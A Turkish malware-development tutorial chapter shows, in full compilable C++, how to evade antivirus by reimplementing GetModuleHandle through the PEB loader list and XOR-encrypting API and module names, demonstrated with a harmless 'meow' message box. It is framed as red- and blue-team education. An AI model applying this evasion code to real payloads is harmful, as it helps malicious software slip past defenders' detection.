\newpage
\subsection{64. Malware AV/VM evasion - bölüm 11 (blogda bölüm 15): WinAPI GetModuleHandle uygulaması. Basit C++ örneği.}

﷽

![av-evasion](./images/92/2023-04-11_09-36.png){width="80%"}      

Bu gönderi, başka bir popüler teknik olan WinAPI `GetModuleHandle` uygulaması aracılığıyla AV motorlarından kaçınma konusundaki kendi araştırmalarımın bir sonucudur.     

### GetModuleHandle

`GetModuleHandle`, çağıran işlemin adres alanındaki yüklü bir modüle bir tutamak (handle) alan Windows API (WinAPI olarak da bilinir) işlevidir. İlgili yürütülebilir veya `DLL` dosyaları için tanımlayıcıları almak için kullanılabilir. Fonksiyon bildirimi `windows.h` başlık dosyasında bulunabilir:    

```cpp
HMODULE GetModuleHandle(
  LPCWSTR lpModuleName
);
```

`GetModuleHandle` kullanırken, modülü serbest bırakmak için `FreeLibrary` çağırmamıza gerek yoktur, çünkü bu işlev yalnızca işlemde zaten yüklü olan bir modüle bir tutamak alır.   

### pratik örnek: `GetModuleHandle`'in özel uygulaması

Process Environment Block (PEB) kullanarak özel bir `GetModuleHandle` uygulaması oluşturmak, belirli senaryolarda antivirüs (AV) tespitinden kaçınmaya yardımcı olabilir.    

`PEB`'yi kullanarak yüklü modüller listesini erişebilir ve istenilen modülü manuel olarak arayabilirsiniz.     

İşte `PEB` kullanarak özel bir `GetModuleHandle` işlevini uygulamak için atılması gereken adımların üst düzey bir özeti:   

- geçerli işlem için `PEB`'ye erişin.    
- `PEB`'nin Ldr yapısındaki `InMemoryOrderModuleList`’i bulun.    
- yüklü modüllerin bağlı listesini yineleyin.    
- her modülün temel adını istenen modül adıyla karşılaştırın.    
- eğer bir eşleşme bulunursa, modülün temel adresini (handle olarak görev yapar) döndürün.    

Dolayısıyla, C dilindeki tam kaynak kodu şu şekildedir:       

```cpp
// custom implementation
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

  // obtaining the offset of PPEB from the beginning of TEB
  PEB* pPeb = (PEB*)__readgsqword(0x60);

  // for x86
  // PEB* pPeb = (PEB*)__readgsqword(0x30);

  // obtaining the address of the head node in a linked list 
  // which represents all the models that are loaded into the process.
  PEB_LDR_DATA* Ldr = pPeb->Ldr;
  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 

  // iterating to the next node. this will be our starting point.
  LIST_ENTRY* pStartListEntry = ModuleList->Flink;

  // iterating through the linked list.
  WCHAR mystr[MAX_PATH] = { 0 };
  WCHAR substr[MAX_PATH] = { 0 };
  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; 
  pListEntry = pListEntry->Flink) {

    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
    LDR_DATA_TABLE_ENTRY* pEntry = 
    (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

    // checking if this is the DLL we are looking for
    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
    wcscpy_s(substr, MAX_PATH, lModuleName);
    if (cmpUnicodeStr(substr, mystr)) {
      // returning the DLL base address.
      return (HMODULE)pEntry->DllBase;
    }
  }

  // the needed DLL wasn't found
  printf("failed to get a handle to %s\n", lModuleName);
  return NULL;
}
```

ve `Unicode` dizelerini karşılaştırmak için kendi fonksiyonumu ekleyin:    

```cpp
int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
  _wcslwr_s(substr, MAX_PATH);
  _wcslwr_s(mystr, MAX_PATH);

  int result = 0;
  if (StrStrW(mystr, substr) != NULL) {
    result = 1;
  }

  return result;
}
```

### AV atlatma örneği

Hadi basit bir "malware" oluşturalım, sadece `meow-meow` mesaj kutusu örneği:    

```cpp
/*
 * hack.cpp - GetModuleHandle implementation. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/2023/04/08/malware-av-evasion-15.html
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>

#pragma comment(lib, "Shlwapi.lib")

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
  _wcslwr_s(substr, MAX_PATH);
  _wcslwr_s(mystr, MAX_PATH);

  int result = 0;
  if (StrStrW(mystr, substr) != NULL) {
    result = 1;
  }

  return result;
}

typedef UINT(CALLBACK* fnMessageBoxA)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);

// custom implementation
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

  // obtaining the offset of PPEB from the beginning of TEB
  PEB* pPeb = (PEB*)__readgsqword(0x60);

  // for x86
  // PEB* pPeb = (PEB*)__readgsqword(0x30);

  // obtaining the address of the head node in a linked list 
  // which represents all the models that are loaded into the process.
  PEB_LDR_DATA* Ldr = pPeb->Ldr;
  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 

  // iterating to the next node. this will be our starting point.
  LIST_ENTRY* pStartListEntry = ModuleList->Flink;

  // iterating through the linked list.
  WCHAR mystr[MAX_PATH] = { 0 };
  WCHAR substr[MAX_PATH] = { 0 };
  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; 
  pListEntry = pListEntry->Flink) {

    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
    LDR_DATA_TABLE_ENTRY* pEntry = 
    (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

    // checking if this is the DLL we are looking for
    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
    wcscpy_s(substr, MAX_PATH, lModuleName);
    if (cmpUnicodeStr(substr, mystr)) {
      // returning the DLL base address.
      return (HMODULE)pEntry->DllBase;
    }
  }

  // the needed DLL wasn't found
  printf("failed to get a handle to %s\n", lModuleName);
  return NULL;
}

// encrypted function name (MessageBoxA)
unsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2, 0x17, 0x31, 0xa, 
0x1b, 0x33 };

// encrypted module name (user32.dll)
unsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43, 0x57, 0x5c, 0x17, 0x9, 
0xf };

// key
char s_key[] = "mysupersecretkey";

// XOR decrypt
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

int main(int argc, char* argv[]) {
  XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));
  XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));

  wchar_t wtext[20];
  mbstowcs(wtext, s_dll, strlen(s_dll)+1); //plus null
  LPWSTR user_dll = wtext;

  HMODULE mod = myGetModuleHandle(user_dll);
  if (NULL == mod) {
    return -2;
  } else {
    printf("meow");
  }

  fnMessageBoxA myMessageBoxA = (fnMessageBoxA)GetProcAddress(mod, (LPCSTR)s_mb);
  myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Gördüğünüz gibi, ayrıca `XOR` şifreleme dizeleri (fonksiyon ve modül adları) ekledim.   

### demo

Hadi her şeyi çalışırken görelim. Öncelikle "malware" kodumuzu derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-s -ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![av-evasion](./images/92/2023-04-11_11-01.png){width="80%"}      

ve kurbanın makinesinde (`Windows 10 x64`) çalıştırın:      

```powershell
.\hack.exe
```

![av-evasion](./images/92/2023-04-11_11-03.png){width="80%"}      

Gördüğünüz gibi, doğruluk için sadece `meow` yazdırıyor. Her şey mükemmel çalıştı =^..^=      

`PE-bear` ile ikili dosyamızı analiz edersek:       

![av-evasion](./images/92/2023-04-11_13-08.png){width="80%"}      

![av-evasion](./images/92/2023-04-11_13-09.png){width="80%"}      

veya `strings`'i kullanarak:        

```bash
strings ./hack.exe
```

![av-evasion](./images/92/2023-04-11_13-11.png){width="80%"}      

![av-evasion](./images/92/2023-04-11_13-11_1.png){width="80%"}      


Sonuç olarak, `GetModuleHandle` WinAPI gizlendi: belirli senaryolarda AV motorlarını atlatmak mümkün.    

Bir sonraki yazımda, kendi `GetProcAddress` uygulamamı inceleyeceğim.     

Umarım bu yazı, mavi takım üyelerine bu ilginç kaçınma tekniği hakkında farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.     

[MITRE ATT&CK: T1027](https://attack.mitre.org/techniques/T1027/)       
[AV evasion: part 1](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html)     
[AV evasion: part 2](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html)      
[GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)         
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-04-08-malware-av-evasion-15)    
